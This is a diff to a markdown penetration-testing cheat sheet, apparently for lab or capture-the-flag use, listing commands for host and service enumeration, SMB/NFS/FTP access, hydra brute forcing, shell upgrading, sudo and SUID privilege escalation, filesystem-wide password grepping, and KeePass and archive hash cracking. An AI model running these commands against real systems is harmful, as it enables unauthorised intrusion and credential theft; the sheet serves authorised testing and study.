@@ -1,15 +1,18 @@
 # Quick Commands
 
 ### Initial Enum
+
  - Sub-domain Enum
 ```bash
 wfuzz -c -f sub-fighter -w WORDLIST.txt -u 'http://site.com' -H "Host: FUZZ.site.com" --hw 290
 ```
+
  - Directory Finding
 ```python
 python3 dirsearch.py -u http://site.com -e html,php -x 403 -t 200 -r -R 3
 dirb http://192.168.20.141:8080 -r
 ```
+
  - Port Scanning
 ```bash
 nmap -T4 TARGET_IP
@@ -23,6 +26,7 @@ nikto -h http://site.com
 ```
 
 ### NFS
+
 ```bash
 nmap -p PORT --script=nfs-ls,nfs-statfs,nfs-showmount TARGET_IP
 showmount -e TARGET_IP
@@ -31,20 +35,25 @@ mount -o rw,vers=2 TARGET_IP:/AVAILABLE_DIR /tmp/nfsmount
 ```
 
 ### SMB Enum
+
 ```bash
 nmap -sV -A -O --script=*vuln* TARGET_IP
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse TARGET_IP
 nmap -p 445 --script smb-protocols TARGET_IP
 nmap -p 139,445 --script smb-vuln* TARGET_IP
+
 smbmap -H TARGET_IP -P 139
+
 smbclient -L \\\\TARGET_IP -U 'Guest' -N
 smbclient \\\\TARGET_IP\\folder -U 'Guest' -N
 get FILE
 ```
 
 ### FTP Enum
+
  - Username = Anonymous, Password = *Blank*
  - USE BINARY MODE FOR FILE TRANSFER!!!!
+
 ```bash
 ftp TARGET_IP
 binary
@@ -53,6 +62,7 @@ put ATTACK_PC_FILE TARGET_PC_FILE
 ```
 
 ### Brute Forcing
+
 ```bash
 hydra -l USERNAME -P passwords.txt TARGET_IP ssh
 hydra -L users.txt -p PASSWORD TARGET_IP ssh
@@ -67,7 +77,9 @@ hydra -L users.txt -P passwords.txt TARGET_IP ftp
 # Quick Commands - ON THE BOX
 
 ### UPGRADE SHELL
+
  - Spawn TTY Shell using one of these:
+
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
@@ -81,15 +93,19 @@ echo os.system('/bin/bash')
 
 
 ### On the Box Enum
+
 ```bash
 sudo -l
 sudo -V
+
 cat /etc/crontab
 cat /etc/exports
+
 ps aux
 ```
 
 ### SUDO & SUID
+
 ```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 getcap -r / 2>/dev/null
@@ -97,6 +113,7 @@ sudo -u#-1 /bin/bash
 ```
 
 ### Deeper on the Box
+
 ```bash
 grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
 grep -r 'someVariable\["config"\]\["db"\]\["password"\]' /var/www/html/*
@@ -105,7 +122,12 @@ grep -r 'someVariable\["config"\]\["db"\]\["password"\]' /var/www/html/*
  - Analyse Program
 ```bash
 strings FILE_NAME
+
+strace FILE_NAME
 strace FILE_NAME 2>&1 | grep -i -E "open|access|no such file"
+
+ltrace FILE_NAME
+
 binwalk FILE_NAME
 binwalk -e FILE_NAME
 ```
@@ -131,6 +153,7 @@ find / -name authorized_keys 2> /dev/null
 
 
 ### General Useful Stuff
+
  - Netcat
 ```bash
 nc -lvp PORT
@@ -163,10 +186,19 @@ sudo -u USER COMMAND
 
 
 ### Random Tools
+
  - CMS Scanning
 ```bash
 joomscan
 ```
+
+ - WordPress Scanning
+```bash
+wpscan --url [TARGET]
+wpscan --url [TARGET] --api-token [API_TOKEN]
+wpscan --url [TARGET] --api-token [API_TOKEN] --enumerate u
+```
+
  - Search for exploits
 ```bash
 searchsploit TEXT
@@ -184,6 +216,7 @@ hash-identifier
 ```
 
 ### Hash Cracking Stuff
+
  - Zip
 ```bash
 zip2john ZIP_FILE > OUTPUT_HASH_FILE
@@ -196,4 +229,10 @@ gpg2john PRIV_KEY.asc > OUTPUT_HASH_FILE
 john OUTPUT_HASH_FILE -w=WORD_LIST_FILE
 gpg --import PRIV_KEY.asc
 gpg --decrypt PAYLOAD.pgp
+```
+
+ - KeePass
+```bash
+keepass2john KEEPASS_FILE > OUTPUT_HASH_FILE
+hashcat -m 13400 OUTPUT_HASH_FILE /usr/share/wordlists/rockyou.txt
 ```
